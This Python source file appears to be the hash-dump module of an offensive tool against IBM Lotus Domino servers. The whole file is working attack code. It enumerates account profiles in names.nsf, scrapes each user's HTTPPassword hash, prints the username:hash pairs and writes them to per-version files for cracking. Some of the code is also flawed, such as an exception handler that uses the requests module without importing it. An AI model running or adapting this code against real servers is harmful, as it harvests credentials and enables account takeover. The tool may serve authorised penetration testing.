# Copyright (c) 2017, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import aiohttp
import asyncio
import bs4
import inflect
import signal
import sys

from .main import DomiOwned


class HashDump(DomiOwned):

	def dump(self):
		"""
		Dump Domino account hashes.
		"""
		# Check if the user can access names.nsf
		if self.check_access(self.username, self.password)['names.nsf']:

			if self.auth_type == 'basic':
				self.session.auth = (self.username, self.password)

			# Enumerate account URLs
			account_urls = self.get_accounts()
			if account_urls:
				self.logger.info("Found {0} account {1}".format(len(account_urls), inflect.engine().plural('hash', len(account_urls))))
				self.get_hashes(account_urls)
			else:
				self.logger.warn('No account hashes found')
		else:
			self.logger.error("Unable to access {0}/names.nsf, bad username or password".format(self.url))

	def get_accounts(self):
		"""
		Enumerate Domino account profile URLs.
		"""
		account_urls = []

		for page in range(1, sys.maxsize**10, 1000):
			try:
				response = self.session.get(
					"{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}&Count=1000".format(self.url, page)
				)
			except KeyboardInterrupt:
				break
			except (requests.exceptions.RequestException, requests.exceptions.ReadTimeoutError) as error:
				self.logger.error('An error occurred while enumerating account profile URLs')
				break

			soup = bs4.BeautifulSoup(response.text, 'lxml')

			# Break if page not found
			if 'No documents found' in str(soup.findAll('h2')):
				break
			else:
				links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
				for link in links:
					if self.utilities.ACCOUNT_REGEX.search(link):
						account_url = "{0}/names.nsf/{1}?OpenDocument".format(self.url, self.utilities.ACCOUNT_REGEX.search(link).group(1))
						account_urls.append(account_url)

		return list(set(account_urls))

	def signal_handler(self):
		"""
		Gracefully handle exiting hash dump.
		"""
		self.logger.debug('Got Ctrl-C, stopping all tasks...')
		for task in asyncio.Task.all_tasks():
			task.cancel()

	def get_hashes(self, urls):
		"""
		Create client session based on authentication type.
		"""
		loop = asyncio.get_event_loop()
		loop.add_signal_handler(signal.SIGINT, self.signal_handler)

		if self.username and self.auth_type == 'basic':
			client = aiohttp.ClientSession(headers=self.utilities.HEADERS, auth=aiohttp.BasicAuth(self.username, self.password), loop=loop)

		elif self.auth_type == 'form':
			# Check if cookies or SSO are being used for authentication
			if 'DomAuthSessId' in self.session.cookies:
				session_id = dict(DomAuthSessId=self.session.cookies['DomAuthSessId'])
			elif 'LtpaToken' in self.session.cookies:
				session_id = dict(LtpaToken=self.session.cookies['LtpaToken'])
			else:
				session_id = None

			client = aiohttp.ClientSession(headers=self.utilities.HEADERS, cookies=session_id, loop=loop)

		else:
			client = aiohttp.ClientSession(headers=self.utilities.HEADERS, loop=loop)

		with client as session:
			try:
				loop.run_until_complete(self.query(session, urls))
			except asyncio.CancelledError:
				sys.exit()
			except Exception as error:
				self.logger.error('An error occurred while dumping Domino account hashes')
				sys.exit()

	async def query(self, session, urls):
		"""
		Build asynchronous requests.
		"""
		await asyncio.gather(*[self.get(session, url) for url in urls])

	async def get(self, session, url):
		"""
		Asynchronously request account URL and parse response.
		"""
		async with session.get(url, compress=True) as response:
			self.parse_hash(await response.text())

	def parse_hash(self, data):
		"""
		Sort Domino hashes by type and write output to a file.
		"""
		soup = bs4.BeautifulSoup(data, 'lxml')

		# Domino account username fields
		for user_param in ['$dspFullName', '$dspShortName']:
			domino_username = soup.find('input', attrs={'name': user_param})['value']
			if domino_username:
				break

		# Domino account hash fields
		for hash_param in ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']:
			domino_hash = soup.find('input', attrs={'name': hash_param})['value']
			if domino_hash:
				break

		if domino_username and domino_hash:
			print("{0}:{1}".format(domino_username, domino_hash))

			hash_length = len(domino_hash)

			# Domino 5 hash format: 3dd2e1e5ac03e230243d58b8c5ada076
			if hash_length == 34:
				domino_hash = domino_hash.strip('()')
				out_file = 'domino_5_hashes.txt'

			# Domino 6 hash format: (GDpOtD35gGlyDksQRxEU)
			elif hash_length == 22:
				out_file = 'domino_6_hashes.txt'

			# Domino 8 hash format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
			else:
				out_file = 'domino_8_hashes.txt'

			f = open(out_file, 'a')
			f.write("{0}:{1}\n".format(domino_username, domino_hash))
